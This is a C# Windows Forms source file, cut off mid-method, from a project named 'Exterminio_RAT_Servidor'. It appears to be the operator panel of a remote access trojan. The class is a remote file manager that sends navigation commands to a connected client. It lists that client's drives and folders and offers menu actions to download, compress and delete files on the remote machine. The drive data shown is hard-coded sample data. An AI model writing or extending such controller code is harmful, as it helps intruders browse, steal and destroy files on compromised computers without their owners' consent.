using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Exterminio_RAT_Servidor
{
    public partial class GestorArchivosClientesFT : Form
    {
        private string clientId;
        private DiskInfo[] discosCliente;
        private string rutaActual = ""; // Para rastrear la ruta actual

        // Propiedad pública para acceder al ID del cliente
        public string ClientId => clientId;

        public GestorArchivosClientesFT(string clienteId)
        {
            InitializeComponent();
            this.clientId = clienteId;
            SetupForm();
            InitializeGestor();
        }

        private void SetupForm()
        {
            // Configurar la ventana
            this.Text = $"Gestor de Archivos - Cliente {clientId}";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = true;
            this.Size = new Size(1000, 500);
            
            // Agregar evento para mantener las cards visibles
            this.Activated += (s, e) => EnsureCardsVisible();
            this.Shown += (s, e) => EnsureCardsVisible();
        }

        private void EnsureCardsVisible()
        {
            try
            {
                // Solo verificar si hay datos de discos disponibles
                if (discosCliente != null && discosCliente.Length > 0)
                {
                    Console.WriteLine("Asegurando que las cards estén visibles...");
                    
                    // Verificar el estado actual
                    int currentCardCount = PanelDiscosCliente.Controls.Count;
                    Console.WriteLine($"Cards actuales en el panel: {currentCardCount}");
                    
                    // Solo recrear si no hay cards y debería haberlas
                    if (currentCardCount == 0)
                    {
                        Console.WriteLine("No hay cards visibles, recreando...");
                        UpdateDisksUI();
                    }
                    else
                    {
                        Console.WriteLine($"Hay {currentCardCount} cards visibles, no es necesario recrear");
                        VerifyCardsState();
                    }
                }
                else
                {
                    Console.WriteLine("No hay datos de discos disponibles para mostrar");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error asegurando visibilidad de cards: {ex.Message}");
            }
        }

        private void InitializeGestor()
        {
            try
            {
                // Configurar PanelDiscosCliente de forma más robusta
                ConfigureFlowLayoutPanel();

                // Configurar ListView para archivos
                ConfigureListView();

                // Mostrar mensaje de carga
                ShowLoadingMessage();

                // Simular carga de discos (aquí se conectaría con el cliente real)
                LoadClientDisks();

                Console.WriteLine($"Gestor de archivos inicializado para cliente {clientId}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error inicializando gestor: {ex.Message}");
                ShowErrorMessage($"Error: {ex.Message}");
            }
        }

        private void ConfigureListView()
        {
            try
            {
                // Configurar ListView con tema oscuro
                listViewArchivos.View = View.Details;
                listViewArchivos.FullRowSelect = true;
                listViewArchivos.GridLines = true;
                listViewArchivos.MultiSelect = false;
                listViewArchivos.HideSelection = false;
                
                // Configurar colores oscuros
                listViewArchivos.BackColor = Color.FromArgb(30, 30, 30);
                listViewArchivos.ForeColor = Color.Red;
                listViewArchivos.GridLines = true;
                
                // Configurar columnas
                listViewArchivos.Columns.Clear();
                listViewArchivos.Columns.Add("Nombre", 200);
                listViewArchivos.Columns.Add("Tamaño", 100);
                listViewArchivos.Columns.Add("Tipo", 80);
                listViewArchivos.Columns.Add("Fecha", 150);
                listViewArchivos.Columns.Add("Ruta", 300);
                
                // Configurar iconos reales de archivos
                ConfigureFileIcons();
                
                // Agregar evento de doble clic
                listViewArchivos.DoubleClick += ListViewArchivos_DoubleClick;
                
                // Agregar evento de clic derecho para menú contextual
                listViewArchivos.MouseClick += ListViewArchivos_MouseClick;
                
                Console.WriteLine("ListView configurado correctamente con tema oscuro, letras rojas e iconos reales");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error configurando ListView: {ex.Message}");
            }
        }

        private void ConfigureFileIcons()
        {
            try
            {
                // Crear ImageList para iconos
                listViewArchivos.SmallImageList = new ImageList();
                listViewArchivos.SmallImageList.ImageSize = new Size(16, 16);
                
                // Usar iconos nativos de Windows (profesionales y reales)
                CargarIconosSistema();
                
                Console.WriteLine("Iconos nativos de Windows configurados correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error configurando iconos de archivos: {ex.Message}");
                // Solo usar fallback si hay error crítico
                CargarIconosFallback();
            }
        }

        private void CargarIconosSistema()
        {
            try
            {
                Console.WriteLine("🔧 Configurando iconos nativos de Windows...");
                
                // Cargar iconos nativos de Windows (profesionales y reales)
                listViewArchivos.SmallImageList.Images.Add("folder", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_FOLDER));
                listViewArchivos.SmallImageList.Images.Add("generic", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_APPLICATION));
                listViewArchivos.SmallImageList.Images.Add("text", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_DOCNOASSOC));
                listViewArchivos.SmallImageList.Images.Add("image", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_IMAGEFILES));
                listViewArchivos.SmallImageList.Images.Add("media", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_AUDIOFILES));
                listViewArchivos.SmallImageList.Images.Add("executable", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_SOFTWARE));
                listViewArchivos.SmallImageList.Images.Add("document", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_DOCASSOC));
                listViewArchivos.SmallImageList.Images.Add("compressed", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_ZIPFILE));
                
                Console.WriteLine("✅ Iconos nativos de Windows cargados correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando iconos nativos: {ex.Message}");
                throw; // Re-lanzar para que ConfigureFileIcons maneje el fallback
            }
        }

        private void CargarIconosFallback()
        {
            try
            {
                Console.WriteLine("🔄 Cargando iconos fallback nativos...");
                
                // Iconos nativos como fallback
                listViewArchivos.SmallImageList.Images.Add("folder", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_FOLDER)); // Carpeta
                listViewArchivos.SmallImageList.Images.Add("generic", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_APPLICATION)); // Genérico
                listViewArchivos.SmallImageList.Images.Add("text", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_DOCNOASSOC)); // Texto
                listViewArchivos.SmallImageList.Images.Add("image", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_IMAGEFILES)); // Imagen
                listViewArchivos.SmallImageList.Images.Add("media", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_AUDIOFILES)); // Multimedia
                listViewArchivos.SmallImageList.Images.Add("executable", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_SOFTWARE)); // Ejecutable
                listViewArchivos.SmallImageList.Images.Add("document", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_DOCASSOC)); // Documento
                listViewArchivos.SmallImageList.Images.Add("compressed", IconHelper.GetStockIcon(NativeMethods.SHSTOCKICONID.SIID_ZIPFILE)); // Comprimido
                
                Console.WriteLine("✅ Iconos fallback nativos cargados correctamente");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando iconos fallback: {ex.Message}");
            }
        }

        private void ListViewArchivos_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (listViewArchivos.SelectedItems.Count > 0)
                {
                    ListViewItem selectedItem = listViewArchivos.SelectedItems[0];
                    
                    // Verificar si es la opción de regresar
                    if (selectedItem.Tag is string && selectedItem.Tag.ToString() == "REGRESAR")
                    {
                        Console.WriteLine("🔄 Regresando atrás...");
                        RegresarAtras();
                        return;
                    }
                    
                    FileSystemEntry archivo = selectedItem.Tag as FileSystemEntry;
                    
                    if (archivo != null)
                    {
                        Console.WriteLine($"Doble clic en: {archivo.Nombre}");
                        NavegarAArchivo(archivo);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en doble clic del ListView: {ex.Message}");
            }
        }

        private void RegresarAtras()
        {
            try
            {
                if (string.IsNullOrEmpty(rutaActual))
                {
                    Console.WriteLine("No hay ruta actual para regresar");
                    return;
                }
                
                string rutaPadre = ObtenerRutaPadre(rutaActual);
                
                if (rutaPadre != rutaActual)
                {
                    Console.WriteLine($"🔄 Regresando atrás: {rutaActual} -> {rutaPadre}");
                    
                    // Actualizar la ruta actual
                    rutaActual = rutaPadre;
                    
                    // Actualizar el título del formulario
                    this.Text = $"Gestor de Archivos - Cliente {clientId} - Ruta: {rutaActual}";
                    
                    // Enviar comando para navegar a la ruta padre
                    Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                    if (mainForm != null && mainForm is Form1 form1)
                    {
                        _ = Task.Run(async () =>
                        {
                            await form1.SendAbrirDiscoCommand(clientId, rutaPadre);
                        });
                        
                        ShowNotification("Navegando", $"Regresando atrás\nRuta: {rutaActual}", ToolTipIcon.Info);
                    }
                }
                else
                {
                    Console.WriteLine("Ya estamos en la raíz del disco");
                    ShowNotification("Información", "Ya estás en la raíz del disco", ToolTipIcon.Info);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error regresando atrás: {ex.Message}");
                ShowNotification("Error", $"Error regresando atrás: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void ListViewArchivos_MouseClick(object sender, MouseEventArgs e)
        {
            try
            {
                if (e.Button == MouseButtons.Right)
                {
                    ListViewItem item = listViewArchivos.GetItemAt(e.X, e.Y);
                    if (item != null)
                    {
                        listViewArchivos.SelectedItems.Clear();
                        item.Selected = true;
                        
                        FileSystemEntry archivo = item.Tag as FileSystemEntry;
                        if (archivo != null)
                        {
                            ShowContextMenu(archivo, e.Location);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en clic derecho del ListView: {ex.Message}");
            }
        }

        private void ShowContextMenu(FileSystemEntry archivo, Point location)
        {
            try
            {
                ContextMenuStrip contextMenu = new ContextMenuStrip();
                
                // Agregar opción "Ir atrás" si no estamos en la raíz
                if (!string.IsNullOrEmpty(rutaActual) && !rutaActual.EndsWith("\\") && !rutaActual.EndsWith(":"))
                {
                    contextMenu.Items.Add("🔙 Ir Atrás", null, (s, e) => RegresarAtras());
                    contextMenu.Items.Add("-"); // Separador
                }
                
                if (archivo.Tipo == "CARPETA")
                {
                    contextMenu.Items.Add("📁 Abrir Carpeta", null, (s, e) => NavegarAArchivo(archivo));
                    contextMenu.Items.Add("🗜️ Comprimir Carpeta", null, (s, e) => ComprimirElemento(archivo));
                    contextMenu.Items.Add("🗑️ Borrar Carpeta", null, (s, e) => BorrarElemento(archivo));
                    contextMenu.Items.Add("📋 Copiar Ruta", null, (s, e) => Clipboard.SetText(archivo.Ruta));
                }
                
                
                else
                {
                    contextMenu.Items.Add("📄 Ver Información", null, (s, e) => 
                    {
                        string info = $"Archivo: {archivo.Nombre}\nTamaño: {archivo.Tamaño}\nRuta: {archivo.Ruta}\nFecha: {archivo.FechaModificacion}";
                        MessageBox.Show(info, "Información del Archivo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                    contextMenu.Items.Add("📥 Descargar Archivo", null, (s, e) => DescargarElemento(archivo));
                    contextMenu.Items.Add("🗜️ Comprimir Archivo", null, (s, e) => ComprimirElemento(archivo));
                    contextMenu.Items.Add("🗑️ Borrar Archivo", null, (s, e) => BorrarElemento(archivo));
                    contextMenu.Items.Add("📋 Copiar Ruta", null, (s, e) => Clipboard.SetText(archivo.Ruta));
                }
                
                // Agregar opción de actualizar vista (siempre disponible)
                contextMenu.Items.Add("-"); // Separador
                contextMenu.Items.Add("🔄 Actualizar Vista", null, (s, e) => ActualizarVistaActual());
                {
                    contextMenu.Items.Add("📄 Ver Información", null, (s, e) => 
                    {
                        string info = $"Archivo: {archivo.Nombre}\nTamaño: {archivo.Tamaño}\nRuta: {archivo.Ruta}\nFecha: {archivo.FechaModificacion}";
                        MessageBox.Show(info, "Información del Archivo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    });
                    contextMenu.Items.Add("🗜️ Comprimir Archivo", null, (s, e) => ComprimirElemento(archivo));
                    contextMenu.Items.Add("🗑️ Borrar Archivo", null, (s, e) => BorrarElemento(archivo));
                    contextMenu.Items.Add("📋 Copiar Ruta", null, (s, e) => Clipboard.SetText(archivo.Ruta));
                }
                
                contextMenu.Show(listViewArchivos, location);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando menú contextual: {ex.Message}");
            }
        }

        private void ConfigureFlowLayoutPanel()
        {
            try
            {
                // Configurar PanelDiscosCliente para scroll vertical
                PanelDiscosCliente.Dock = DockStyle.Fill;
                PanelDiscosCliente.AutoScroll = true;
                PanelDiscosCliente.WrapContents = false; // No hacer wrap para lista vertical
                PanelDiscosCliente.FlowDirection = FlowDirection.TopDown; // Flujo vertical
                PanelDiscosCliente.Padding = new Padding(10);
                PanelDiscosCliente.AutoSize = false;
                PanelDiscosCliente.AutoSizeMode = AutoSizeMode.GrowAndShrink;
                
                // Configuraciones para scroll vertical
                PanelDiscosCliente.AutoScrollMinSize = new Size(0, 0);
                PanelDiscosCliente.HorizontalScroll.Enabled = false;
                PanelDiscosCliente.HorizontalScroll.Visible = false;
                PanelDiscosCliente.HorizontalScroll.Maximum = 0;
                PanelDiscosCliente.VerticalScroll.Enabled = true;
                PanelDiscosCliente.VerticalScroll.Visible = true;
                PanelDiscosCliente.VerticalScroll.Maximum = 1000; // Permitir scroll hasta 1000px
                
                // Configurar el tamaño del panel para forzar scroll
                PanelDiscosCliente.Size = new Size(PanelDiscosCliente.Width, 400); // Altura fija
                
                // Asegurar que el panel esté visible y habilitado
                PanelDiscosCliente.Visible = true;
                PanelDiscosCliente.Enabled = true;
                
                Console.WriteLine("PanelDiscosCliente configurado correctamente con scroll vertical");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error configurando FlowLayoutPanel: {ex.Message}");
            }
        }

        private void ShowLoadingMessage()
        {
            try
            {
                // Limpiar ListView
                listViewArchivos.Items.Clear();
                
                // Crear item de carga
                ListViewItem loadingItem = new ListViewItem();
                loadingItem.Text = $"🔄 Cargando discos del cliente {clientId}...";
                loadingItem.ForeColor = Color.White;
                loadingItem.Font = new Font("Segoe UI", 12, FontStyle.Bold);
                
                // Agregar al ListView
                listViewArchivos.Items.Add(loadingItem);
                
                Console.WriteLine($"Mensaje de carga mostrado en ListView para cliente {clientId}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando mensaje de carga: {ex.Message}");
            }
        }

        private void ShowErrorMessage(string message)
        {
            try
            {
                // Limpiar ListView
                listViewArchivos.Items.Clear();
                
                // Crear item de error
                ListViewItem errorItem = new ListViewItem();
                errorItem.Text = $"❌ {message}";
                errorItem.ForeColor = Color.Red;
                errorItem.Font = new Font("Segoe UI", 10, FontStyle.Bold);
                
                // Agregar al ListView
                listViewArchivos.Items.Add(errorItem);
                
                Console.WriteLine($"Error mostrado en ListView: {message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando mensaje de error: {ex.Message}");
            }
        }

        private void LoadClientDisks()
        {
            try
            {
                // Simular datos de discos (en la implementación real, esto vendría del cliente)
                // Por ahora, creamos discos de ejemplo
                discosCliente = new DiskInfo[]
                {
                    new DiskInfo { LetraUnidad = "C:", Modelo = "Samsung SSD 860 EVO", TamanoTotal = "500GB", EspacioLibre = "350GB", TipoParticion = "GPT" },
                    new DiskInfo { LetraUnidad = "D:", Modelo = "Seagate Barracuda", TamanoTotal = "1TB", EspacioLibre = "750GB", TipoParticion = "MBR" },
                    new DiskInfo { LetraUnidad = "E:", Modelo = "Western Digital Blue", TamanoTotal = "250GB", EspacioLibre = "100GB", TipoParticion = "GPT" }
                };

                // Limpiar panel
                PanelDiscosCliente.Controls.Clear();

                // Agregar cards de discos
                foreach (DiskInfo disco in discosCliente)
                {
                    AddDiskCard(disco);
                }

                Console.WriteLine($"Cargados {discosCliente.Length} discos para el cliente {clientId}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error cargando discos: {ex.Message}");
                ShowErrorMessage($"Error cargando discos: {ex.Message}");
            }
        }

        private void AddDiskCard(DiskInfo disco)
        {
            try
            {
                CardDiscos cardDisco = CreateDiskCard(disco);
                if (cardDisco != null)
                {
                    // Agregar al panel
                    PanelDiscosCliente.Controls.Add(cardDisco);
                    Console.WriteLine($"Card agregada para disco {disco.LetraUnidad}: {cardDisco.Name}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error agregando card para disco {disco.LetraUnidad}: {ex.Message}");
            }
        }

        private void OpenDiskExplorer(DiskInfo disco)
        {
            try
            {
                Console.WriteLine($"🎯 OPEN DISK EXPLORER - Disco: {disco.LetraUnidad}, Cliente: {clientId}");
                
                // Establecer la ruta inicial
                rutaActual = disco.LetraUnidad;
                
                // Actualizar el título del formulario con la ruta actual
                this.Text = $"Gestor de Archivos - Cliente {clientId} - Ruta: {rutaActual}";
                
                // Mostrar mensaje inmediato para confirmar que el clic funcionó
                MessageBox.Show($"¡COMANDO ABRIRDISCO ENVIADO!\nDisco: {disco.LetraUnidad}\nCliente: {clientId}", "Comando Enviado", MessageBoxButtons.OK, MessageBoxIcon.Information);
                
                // Buscar el formulario principal para enviar el comando
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    Console.WriteLine($"✅ Formulario principal encontrado, enviando comando ABRIRDISCO:{disco.LetraUnidad}");
                    
                    // Enviar comando AbrirDisco al cliente
                    _ = Task.Run(async () =>
                    {
                        await form1.SendAbrirDiscoCommand(clientId, disco.LetraUnidad);
                    });
                    
                    ShowNotification("Comando Enviado", $"Comando AbrirDisco enviado para disco {disco.LetraUnidad} del cliente {clientId}", ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"❌ No se pudo encontrar el formulario principal");
                    ShowNotification("Error", "No se pudo encontrar el formulario principal", ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error abriendo explorador: {ex.Message}");
                ShowNotification("Error", $"Error abriendo explorador: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void ShowNotification(string title, string message, ToolTipIcon icon = ToolTipIcon.Info)
        {
            try
            {
                // Buscar el formulario principal para acceder al NotifyIcon
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    form1.ShowNotification(title, message, icon);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando notificación: {ex.Message}");
            }
        }

        // Método para verificar el estado de las cards
        private void VerifyCardsState()
        {
            try
            {
                int cardCount = PanelDiscosCliente.Controls.Count;
                Console.WriteLine($"Estado actual del panel: {cardCount} controles");
                
                foreach (Control control in PanelDiscosCliente.Controls)
                {
                    if (control is CardDiscos card)
                    {
                        Console.WriteLine($"Card encontrada: {card.Name}, Visible: {card.Visible}, Enabled: {card.Enabled}");
                    }
                }
                
                // Si debería haber cards pero no las hay, restaurarlas
                if (cardCount == 0 && discosCliente != null && discosCliente.Length > 0)
                {
                    Console.WriteLine("⚠️ Cards perdidas detectadas, restaurando...");
                    RestoreCards();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error verificando estado de cards: {ex.Message}");
            }
        }
        
        // Método para restaurar las cards si se pierden
        private void RestoreCards()
        {
            try
            {
                Console.WriteLine("🔄 Restaurando cards perdidas...");
                
                // Limpiar panel
                PanelDiscosCliente.Controls.Clear();
                
                // Recrear todas las cards
                foreach (DiskInfo disco in discosCliente)
                {
                    CardDiscos cardDisco = CreateDiskCard(disco);
                    if (cardDisco != null)
                    {
                        PanelDiscosCliente.Controls.Add(cardDisco);
                        Console.WriteLine($"Card restaurada: {cardDisco.Name}");
                    }
                }
                
                // Configurar scroll según cantidad de cards
                ConfigureScrollForCards();
                
                // Forzar refresco
                PanelDiscosCliente.Refresh();
                PanelDiscosCliente.Update();
                
                Console.WriteLine($"✅ Cards restauradas: {PanelDiscosCliente.Controls.Count} cards");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error restaurando cards: {ex.Message}");
            }
        }
        
        // Método para configurar el scroll según la cantidad de cards
        private void ConfigureScrollForCards()
        {
            try
            {
                int cardCount = PanelDiscosCliente.Controls.Count;
                int cardHeight = 80; // Altura de cada card
                int padding = 10; // Padding del panel
                int totalHeight = (cardCount * cardHeight) + (padding * 2);
                
                // Configurar scroll vertical si es necesario
                if (totalHeight > PanelDiscosCliente.Height)
                {
                    PanelDiscosCliente.VerticalScroll.Enabled = true;
                    PanelDiscosCliente.VerticalScroll.Visible = true;
                    PanelDiscosCliente.VerticalScroll.Maximum = totalHeight - PanelDiscosCliente.Height;
                    Console.WriteLine($"Scroll configurado para {cardCount} cards (altura total: {totalHeight}px)");
                }
                else
                {
                    PanelDiscosCliente.VerticalScroll.Enabled = false;
                    PanelDiscosCliente.VerticalScroll.Visible = false;
                    Console.WriteLine($"No se necesita scroll para {cardCount} cards");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error configurando scroll: {ex.Message}");
            }
        }

        // Método público para actualizar los archivos con datos reales del cliente
        public void UpdateFilesFromClient(string archivosInfoString)
        {
            try
            {
                Console.WriteLine($"🎯 UPDATE FILES FROM CLIENT - Cliente: {clientId}");
                Console.WriteLine($"📊 Tamaño de datos: {archivosInfoString.Length} caracteres");
                Console.WriteLine($"📋 Primeros 100 chars: {archivosInfoString.Substring(0, Math.Min(100, archivosInfoString.Length))}");
                
                // Procesar la información de archivos recibida del cliente
                string processedInfo = AbrirDiscoProcessor.ProcesarDatosAbrirDiscoRecibidos(archivosInfoString);
                
                if (!processedInfo.StartsWith("ERROR:"))
                {
                    // Parsear la información de archivos
                    FileSystemEntry[] archivos = AbrirDiscoProcessor.ParsearInformacionArchivos(processedInfo);
                    
                    Console.WriteLine($"Archivos parseados: {archivos.Length} archivos encontrados");
                    
                    // Actualizar la UI de forma segura
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            UpdateFilesUI(archivos);
                        });
                    }
                    else
                    {
                        UpdateFilesUI(archivos);
                    }
                    
                    Console.WriteLine($"Archivos actualizados para cliente {clientId}: {archivos.Length} archivos");
                }
                else
                {
                    Console.WriteLine($"Error procesando información de archivos: {processedInfo}");
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ShowErrorMessage($"Error procesando archivos: {processedInfo}");
                        });
                    }
                    else
                    {
                        ShowErrorMessage($"Error procesando archivos: {processedInfo}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando archivos: {ex.Message}");
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowErrorMessage($"Error actualizando archivos: {ex.Message}");
                    });
                }
                else
                {
                    ShowErrorMessage($"Error actualizando archivos: {ex.Message}");
                }
            }
        }

        private void UpdateFilesUI(FileSystemEntry[] archivos)
        {
            try
            {
                Console.WriteLine($"Actualizando ListView con {archivos.Length} archivos");
                
                // Limpiar ListView
                listViewArchivos.Items.Clear();
                
                // Agregar opción de regresar atrás si no estamos en la raíz
                if (!string.IsNullOrEmpty(rutaActual) && !rutaActual.EndsWith("\\") && !rutaActual.EndsWith(":"))
                {
                    AgregarOpcionRegresar();
                }
                
                if (archivos.Length > 0)
                {
                    foreach (FileSystemEntry archivo in archivos)
                    {
                        Console.WriteLine($"Agregando archivo al ListView: {archivo.Nombre} ({archivo.Tipo})");
                        AgregarArchivoAListView(archivo);
                    }
                    
                    Console.WriteLine($"ListView actualizado exitosamente con {archivos.Length} archivos");
                }
                else
                {
                    ShowErrorMessage("No se encontraron archivos en la ruta especificada");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando ListView: {ex.Message}");
                ShowErrorMessage($"Error actualizando ListView: {ex.Message}");
            }
        }

        private void AgregarOpcionRegresar()
        {
            try
            {
                // Crear ListViewItem para regresar
                ListViewItem regresarItem = new ListViewItem();
                regresarItem.Text = "Regresar Atrás";
                regresarItem.ForeColor = Color.Orange;
                regresarItem.Font = new Font("Segoe UI", 9, FontStyle.Bold);
                regresarItem.ImageKey = "folder"; // Clave del icono de carpeta
                
                // Agregar subitems
                regresarItem.SubItems.Add("");
                regresarItem.SubItems.Add("NAVEGACIÓN");
                regresarItem.SubItems.Add("");
                regresarItem.SubItems.Add(ObtenerRutaPadre(rutaActual));
                
                // Marcar como opción de regreso
                regresarItem.Tag = "REGRESAR";
                
                // Agregar al ListView
                listViewArchivos.Items.Add(regresarItem);
                
                Console.WriteLine($"Opción de regresar agregada: {ObtenerRutaPadre(rutaActual)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error agregando opción de regresar: {ex.Message}");
            }
        }

        private string ObtenerRutaPadre(string ruta)
        {
            try
            {
                if (string.IsNullOrEmpty(ruta) || ruta.EndsWith("\\") || ruta.EndsWith(":"))
                {
                    return ruta; // Ya estamos en la raíz
                }
                
                // Obtener la ruta padre
                string rutaPadre = System.IO.Path.GetDirectoryName(ruta);
                if (string.IsNullOrEmpty(rutaPadre))
                {
                    // Si no hay directorio padre, volver a la raíz del disco
                    return ruta.Substring(0, 2) + "\\"; // C:\
                }
                
                return rutaPadre;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo ruta padre: {ex.Message}");
                return ruta;
            }
        }

        private void AgregarArchivoAListView(FileSystemEntry archivo)
        {
            try
            {
                // Crear ListViewItem
                ListViewItem item = new ListViewItem();
                
                // Configurar el icono según el tipo
                if (archivo.Tipo == "CARPETA")
                {
                    item.ImageKey = "folder"; // Clave del icono de carpeta
                    item.Text = archivo.Nombre; // Sin emoji, solo el nombre
                    item.ForeColor = Color.LightCoral; // Color rojo claro para carpetas
                }
                else
                {
                    // Determinar el icono según la extensión del archivo
                    string claveIcono = ObtenerClaveIconoArchivo(archivo.Nombre);
                    item.ImageKey = claveIcono;
                    item.Text = archivo.Nombre; // Sin emoji, solo el nombre
                    item.ForeColor = Color.Red; // Color rojo para archivos
                }
                
                // Agregar subitems con información adicional
                item.SubItems.Add(archivo.Tamaño);
                item.SubItems.Add(archivo.Tipo);
                item.SubItems.Add(archivo.FechaModificacion);
                item.SubItems.Add(archivo.Ruta);
                
                // Configurar colores de subitems
                foreach (ListViewItem.ListViewSubItem subItem in item.SubItems)
                {
                    subItem.ForeColor = Color.Red;
                }
                
                // Guardar referencia al archivo en el Tag
                item.Tag = archivo;
                
                // Agregar al ListView
                listViewArchivos.Items.Add(item);
                
                Console.WriteLine($"Archivo agregado al ListView: {archivo.Nombre} con icono clave {item.ImageKey}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error agregando archivo al ListView: {ex.Message}");
            }
        }

        private string ObtenerClaveIconoArchivo(string nombreArchivo)
        {
            try
            {
                string extension = Path.GetExtension(nombreArchivo).ToLower();
                
                // Si es una carpeta (no tiene extensión o es directorio)
                if (string.IsNullOrEmpty(extension))
                {
                    return "folder";
                }
                
                // Determinar el tipo de archivo según la extensión
                switch (extension)
                {
                    // Archivos de texto
                    case ".txt":
                    case ".log":
                    case ".ini":
                    case ".cfg":
                    case ".conf":
                    case ".xml":
                    case ".json":
                    case ".csv":
                        return "text";
                    
                    // Archivos de imagen
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                    case ".gif":
                    case ".bmp":
                    case ".tiff":
                    case ".ico":
                    case ".svg":
                    case ".webp":
                    case ".raw":
                        return "image";
                    
                    // Archivos de música/video
                    case ".mp3":
                    case ".wav":
                    case ".flac":
                    case ".aac":
                    case ".ogg":
                    case ".wma":
                    case ".m4a":
                    case ".mp4":
                    case ".avi":
                    case ".mkv":
                    case ".mov":
                    case ".wmv":
                    case ".flv":
                    case ".webm":
                    case ".m4v":
                    case ".3gp":
                        return "media";
                    
                    // Archivos ejecutables
                    case ".exe":
                    case ".msi":
                    case ".bat":
                    case ".cmd":
                    case ".com":
                    case ".scr":
                    case ".pif":
                        return "executable";
                    
                    // Archivos de documento
                    case ".doc":
                    case ".docx":
                    case ".pdf":
                    case ".rtf":
                    case ".odt":
                    case ".xls":
                    case ".xlsx":
                    case ".ppt":
                    case ".pptx":
                    case ".odp":
                    case ".ods":
                    case ".pages":
                    case ".numbers":
                    case ".key":
                        return "document";
                    
                    // Archivos comprimidos
                    case ".zip":
                    case ".rar":
                    case ".7z":
                    case ".tar":
                    case ".gz":
                    case ".bz2":
                    case ".xz":
                    case ".lzma":
                    case ".cab":
                    case ".iso":
                        return "compressed";
                    
                    // Archivo genérico (por defecto)
                    default:
                        return "generic";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo clave de icono para {nombreArchivo}: {ex.Message}");
                return "generic"; // Icono genérico por defecto
            }
        }

        private void NavegarAArchivo(FileSystemEntry archivo)
        {
            try
            {
                Console.WriteLine($"Navegando a: {archivo.Ruta}");
                
                if (archivo.Tipo == "CARPETA")
                {
                    // Actualizar la ruta actual
                    rutaActual = archivo.Ruta;
                    
                    // Actualizar el título del formulario
                    this.Text = $"Gestor de Archivos - Cliente {clientId} - Ruta: {rutaActual}";
                    
                    // Navegar a la carpeta
                    Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                    if (mainForm != null && mainForm is Form1 form1)
                    {
                        // Enviar comando AbrirDisco con la nueva ruta
                        _ = Task.Run(async () =>
                        {
                            await form1.SendAbrirDiscoCommand(clientId, archivo.Ruta);
                        });
                        
                        ShowNotification("Navegando", $"Navegando a carpeta: {archivo.Nombre}\nRuta: {rutaActual}", ToolTipIcon.Info);
                    }
                }
                else
                {
                    // Es un archivo, mostrar información
